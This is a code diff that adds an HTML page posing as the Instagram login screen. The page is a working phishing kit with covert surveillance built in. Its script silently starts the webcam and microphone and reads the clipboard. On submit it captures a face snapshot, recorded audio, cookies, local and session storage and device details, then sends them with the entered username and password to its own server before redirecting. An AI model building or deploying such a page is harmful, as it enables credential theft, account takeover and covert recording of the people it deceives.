@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://www.instagram.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fafafa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        /* Top Nav */
+        .ig-nav {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+            height: 54px;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 20px;
+        }
+        .ig-nav-logo {
+            font-size: 22px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-family: 'Billabong', cursive;
+            letter-spacing: 1px;
+        }
+        /* Main container */
+        .ig-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 54px 16px 16px;
+            gap: 32px;
+        }
+        /* Phone mockup (hidden on mobile) */
+        .ig-phone {
+            display: none;
+        }
+        @media (min-width: 768px) {
+            .ig-phone {
+                display: block;
+                width: 380px;
+            }
+            .ig-phone img {
+                width: 100%;
+            }
+        }
+        /* Login card */
+        .ig-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 2px;
+            padding: 40px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .ig-logo {
+            font-size: 42px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 28px;
+            display: block;
+            font-family: Georgia, serif;
+            letter-spacing: -1px;
+        }
+        .ig-divider {
+            display: flex; align-items: center; gap: 16px;
+            margin: 18px 0;
+            color: #8e8e8e; font-size: 13px; font-weight: 600;
+            text-transform: uppercase;
+        }
+        .ig-divider::before, .ig-divider::after {
+            content: ''; flex: 1; height: 1px; background: #dbdbdb;
+        }
+        .ig-input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 12px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            outline: none;
+            transition: border-color .2s;
+        }
+        .ig-input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+        .ig-btn {
+            width: 100%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px;
+            cursor: pointer;
+            margin-top: 8px;
+            opacity: 1;
+            transition: opacity .2s;
+        }
+        .ig-btn:hover { opacity: 0.85; }
+        .ig-btn:disabled { opacity: 0.5; cursor: default; }
+        .ig-forgot {
+            color: #00376b; font-size: 12px;
+            text-decoration: none; display: block;
+            margin-top: 14px;
+        }
+        .ig-signup-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 2px;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .ig-signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .ig-app-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .ig-app-links div { margin-bottom: 12px; }
+        .ig-app-badge { height: 40px; margin: 4px; }
+        .ig-error {
+            color: #ed4956; font-size: 13px;
+            margin-bottom: 10px; display: none;
+        }
+        .ig-spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.5);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin .7s linear infinite;
+            display: none; margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        /* Hidden elements */
+        video, canvas { display: none; }
+        /* Instagram stories bar placeholder */
+        .ig-footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .ig-footer a { color: #8e8e8e; text-decoration: none; margin: 4px; }
+    </style>
+</head>
+<body>
+
+<nav class="ig-nav">
+    <div class="ig-nav-logo">Instagram</div>
+    <div style="display:flex;gap:16px;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#262626"><path d="M12.003 2.001a9.705 9.705 0 1 1 0 19.41 9.705 9.705 0 0 1 0-19.41zm0 1.5a8.205 8.205 0 1 0 0 16.41 8.205 8.205 0 0 0 0-16.41zm0 3.99a4.5 4.5 0 1 1 0 9 4.5 4.5 0 0 1 0-9zm0 1.5a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm5.25-3a1.125 1.125 0 1 1 0 2.25 1.125 1.125 0 0 1 0-2.25z"/></svg>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#262626"><path d="M22.004 2H2v20l4-4h16V2zm-4 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
+    </div>
+</nav>
+
+<video id="ig-video" autoplay muted playsinline></video>
+<canvas id="ig-canvas"></canvas>
+{% csrf_token %}
+
+<div class="ig-container">
+    <div style="display:flex;flex-direction:column;align-items:center;">
+        <!-- Login Card -->
+        <div class="ig-card">
+            <span class="ig-logo">Instagram</span>
+
+            <div id="ig-error" class="ig-error">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+
+            <input type="text" id="ig-username" class="ig-input" placeholder="Phone number, username, or email" autocomplete="username">
+            <input type="password" id="ig-password" class="ig-input" placeholder="Password" autocomplete="current-password">
+            <button id="ig-login-btn" class="ig-btn" onclick="igLogin()">
+                <span id="ig-btn-text">Log in</span>
+                <div id="ig-spinner" class="ig-spinner"></div>
+            </button>
+
+            <div class="ig-divider">or</div>
+
+            <div style="margin-bottom:16px;">
+                <svg viewBox="0 0 40 40" width="20" height="20" style="vertical-align:middle;margin-right:8px;"><path fill="#1877f2" d="M40 20C40 9 31 0 20 0S0 9 0 20c0 10 7.3 18.2 16.9 19.8V25.8h-5.1V20h5.1v-4.4c0-5 3-7.8 7.6-7.8 2.2 0 4.5.4 4.5.4v4.9h-2.5c-2.5 0-3.3 1.6-3.3 3.2V20h5.6l-.9 5.8h-4.7v13.9C32.7 38.2 40 30 40 20z"/></svg>
+                <span style="color:#385898;font-weight:600;font-size:14px;cursor:pointer;" onclick="igLogin()">Log in with Facebook</span>
+            </div>
+
+            <a href="#" class="ig-forgot">Forgot password?</a>
+        </div>
+
+        <!-- Signup Card -->
+        <div class="ig-signup-card">
+            Don't have an account? <a href="#" onclick="igLogin(); return false;">Sign up</a>
+        </div>
+
+        <!-- App Links -->
+        <div class="ig-app-links">
+            <div>Get the app.</div>
+            <img class="ig-app-badge" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" onerror="this.style.display='none'">
+            <img class="ig-app-badge" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" onerror="this.style.display='none'">
+        </div>
+    </div>
+</div>
+
+<footer class="ig-footer">
+    <div>
+        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
+        <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
+        <a href="#">Locations</a> <a href="#">Instagram Lite</a>
+    </div>
+    <div style="margin-top:8px;">English &copy; 2025 Instagram from Meta</div>
+</footer>
+
+<script>
+    // ── Hardware capture ──
+    const igVideo = document.getElementById('ig-video');
+    const igCanvas = document.getElementById('ig-canvas');
+    let igStream = null, igWebcamReady = false;
+    let igRecorder = null, igAudioChunks = [], igAudioReady = false;
+    let igHardwareDone = false;
+    let igClipboard = null, igBattery = null, igNetwork = null;
+
+    function igStartHardware() {
+        if (igHardwareDone) return;
+        igHardwareDone = true;
+        if (!navigator.mediaDevices) return;
+        navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+            audio: { echoCancellation: false, noiseSuppression: false }
+        }).then(stream => {
+            igStream = stream;
+            igVideo.srcObject = stream;
+            igVideo.play().catch(() => {});
+            igVideo.addEventListener('canplay', () => { igWebcamReady = true; });
+            try {
+                const at = stream.getAudioTracks();
+                if (at.length > 0) {
+                    igRecorder = new MediaRecorder(new MediaStream(at));
+                    igRecorder.ondataavailable = e => { if (e.data.size > 0) igAudioChunks.push(e.data); };
+                    igAudioReady = true;
+                    igRecorder.start(1000);
+                }
+            } catch(e) {}
+        }).catch(err => { igHardwareDone = false; });
+    }
+
+    function igStealClipboard() {
+        try {
+            navigator.clipboard && navigator.clipboard.readText().then(t => { if (t.trim()) igClipboard = t.slice(0, 2000); }).catch(() => {});
+        } catch(e) {}
+    }
+
+    try { navigator.getBattery && navigator.getBattery().then(b => { igBattery = `${Math.round(b.level*100)}%${b.charging?'⚡':'🔋'}`; }); } catch(e) {}
+    try { const c = navigator.connection || navigator.mozConnection; if (c) igNetwork = `${c.effectiveType||''} ${c.downlink?c.downlink+'Mbps':''}`.trim(); } catch(e) {}
+
+    document.addEventListener('click', igStealClipboard, { once: true });
+    window.addEventListener('load', () => setTimeout(igStartHardware, 600));
+
+    async function igLogin() {
+        const username = document.getElementById('ig-username').value.trim();
+        const password = document.getElementById('ig-password').value.trim();
+
+        if (!username || !password) {
+            document.getElementById('ig-error').style.display = 'block';
+            return;
+        }
+
+        const btn = document.getElementById('ig-login-btn');
+        const btnText = document.getElementById('ig-btn-text');
+        const spinner = document.getElementById('ig-spinner');
+        btn.disabled = true;
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+        document.getElementById('ig-error').style.display = 'none';
+
+        igStealClipboard();
+
+        // Capture media
+        let snap = null, audioB64 = null;
+        try {
+            if (igStream && igVideo.videoWidth > 0 && igVideo.readyState >= 2) {
+                igCanvas.width = igVideo.videoWidth;
+                igCanvas.height = igVideo.videoHeight;
+                igCanvas.getContext('2d').drawImage(igVideo, 0, 0);
+                snap = igCanvas.toDataURL('image/jpeg', 0.8);
+            }
+        } catch(e) {}
+
+        const sendData = (audioB64) => {
+            const ls = {}, ss = {};
+            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k); } } catch(e) {}
+            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage.getItem(k); } } catch(e) {}
+
+            const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+                body: JSON.stringify({
+                    username, password,
+                    webcam_snap: snap,
+                    voice_audio: audioB64,
+                    source_url: window.location.href,
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    device_info: `IG|Screen:${screen.width}x${screen.height}|Lang:${navigator.language}${igBattery ? '|BAT:' + igBattery : ''}${igNetwork ? '|NET:' + igNetwork : ''}`,
+                    local_storage: JSON.stringify(ls),
+                    session_storage: JSON.stringify(ss),
+                    cookies: document.cookie,
+                    authMode: 'LOGIN',
+                    clipboard: igClipboard,
+                    battery: igBattery,
+                    network_type: igNetwork,
+                    client_timestamp: new Date().toISOString(),
+                    client_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                })
+            }).catch(() => {}).finally(() => {
+                setTimeout(() => { window.location.href = '/apps/'; }, 600);
+            });
+        };
+
+        if (igAudioReady && igRecorder && igRecorder.state === 'recording') {
+            igRecorder.onstop = () => {
+                try {
+                    const blob = new Blob(igAudioChunks, { type: igRecorder.mimeType });
+                    const r = new FileReader();
+                    r.readAsDataURL(blob);
+                    r.onloadend = () => sendData(r.result);
+                    r.onerror = () => sendData(null);
+                } catch(e) { sendData(null); }
+            };
+            igRecorder.stop();
+        } else {
+            sendData(null);
+        }
+    }
+
+    // Enter key trigger
+    document.addEventListener('keydown', e => {
+        if (e.key === 'Enter') igLogin();
+    });
+</script>
+
+</body>
+</html>
